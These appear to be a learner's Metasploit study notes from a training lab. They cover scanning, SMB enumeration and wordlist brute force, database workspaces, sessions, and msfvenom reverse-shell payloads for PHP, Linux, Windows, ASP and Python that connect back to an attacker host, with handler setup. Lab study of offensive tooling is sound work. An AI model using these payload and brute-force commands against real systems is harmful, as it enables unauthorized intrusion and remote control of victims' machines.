### MSF
Port Scanning
You can list potential port scanning modules available using >>> search portscan

CONCURRENCY
Number of targets to be scanned simultaneously.

PORTS: 
Port range to be scanned. Please note that 1-1000 here will not be the same as using Nmap with the default configuration. Nmap will scan the 1000 most used ports, while Metasploit will scan port numbers from 1 to 10000.

RHOSTS: 
Target or target network to be scanned.

THREADS: 
Number of threads that will be used simultaneously. More threads will result in faster scans.

### NMAP IN MSF
You can directly perform Nmap scans from the msfconsole prompt as shown below faster:
msf6 > nmap -sS 10.10.12.229

### UDP service Identification
module will allow you to quickly identify services running over the UDP
scanner/discovery/udp_sweep

### SMB Scans
smb_enumshares and smb_version

### Brute force SMB using a wordlist
auxiliary/scanner/smb/smb_login 
set PASS_FILE /usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt

### Metasploit Database
PostgreSQL database which Metasploit will use with the following command: 
systemctl start postgresql

Initialize the Metasploit Database using the 
msfdb init

 You can now launch 
 msfconsole

 check the database status using the 
 db_status

The database feature will allow you to create workspaces to isolate different projects. When first launched, you should be in the default workspace. You can list available workspaces using the 
workspace

 You can add a workspace using the -a parameter or delete a workspace using the -d parameter
 workspace -a tryhackme

 You can use the workspace command to navigate between workspaces simply by typing workspace followed by the desired workspace name.

  You can use the workspace -h command to list available options for the workspace command.  

 If you run a Nmap scan using the db_nmap shown below, all results will be saved to the database. 

You can now reach information relevant to hosts and services running on target systems with the hosts and services commands, respectively. 
hosts
services

 The hosts -h and services -h commands can help you become more familiar with available options. 

 Once the host information is stored in the database, you can use the hosts -R command to add this value to the RHOSTS parameter.
 If there is more than one host saved to the database, all IP addresses will be used when the hosts -R command is used.  

 The services command used with the -S parameter will allow you to search for specific services in the environment. 

 session is opened, you can background it using CTRL+Z or abort it using CTRL+C

 ### Working with sessions
 sessions

 You can interact with any existing session using the sessions -i command followed by the session ID.

### Search files in meterpreter session (WINDOWS)
search -f flag.txt

### MSF VENOM ####
All payloads 
msfvenom -l payloads

You can either generate stand-alone payloads (e.g. a Windows executable for Meterpreter) or get a usable raw format (e.g. python). Themsfvenom --list formats command can be used to list supported output formats

### Encoders
Contrary to some beliefs, encoders do not aim to bypass antivirus installed on the target system. As the name suggests, they encode the payload. While it can be effective against some antivirus software, using modern obfuscation techniques or learning methods to inject shellcode is a better solution to the problem. The example below shows the usage of encoding (with the -e parameter. The PHP version of Meterpreter was encoded in Base64, and the output format was raw. 

### Handlers
The exploit steps are;

    1. Generate the PHP shell using MSFvenom
    2. Start the Metasploit handler
    3. Execute the PHP shell 
Example: msfvenom -p php/reverse_php LHOST=10.0.2.19 LPORT=7777 -f raw > reverse_shell.php

Please note: The output PHP file will miss the starting PHP tag commented and the end tag (?>), as seen below. 
from /*<?php /**/
to <?php


end ?>

The reverse_shell.php file should be edited to convert it into a working PHP file. 

add the  <?php in starting of the payload and ?> at the end of the payload.	

We will use Multi Handler to receive the incoming connection. The module can be used with the use exploit/multi/handler command.

Multi handler supports all Metasploit payloads and can be used for Meterpreter as well as regular shells.

To use the module, we will need to set the payload value (php/reverse_php in this case), the LHOST, and LPORT values. 

Once everything is set, we will run the handler and wait for the incoming connection. 

### Other Payloads

Linux Executable and Linkable Format (elf)
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf

The .elf format is comparable to the .exe format in Windows. These are executable files for Linux. However, you may still need to make sure they have executable permissions on the target machine. For example, once you have the shell.elf file on your target machine, use the chmod +x shell.elf command to accord executable permissions. Once done, you can run this file by typing ./shell.elf on the target machine command line. 

 Windows 
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe

 PHP
 msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php

 ASP
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp

 Python
 msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py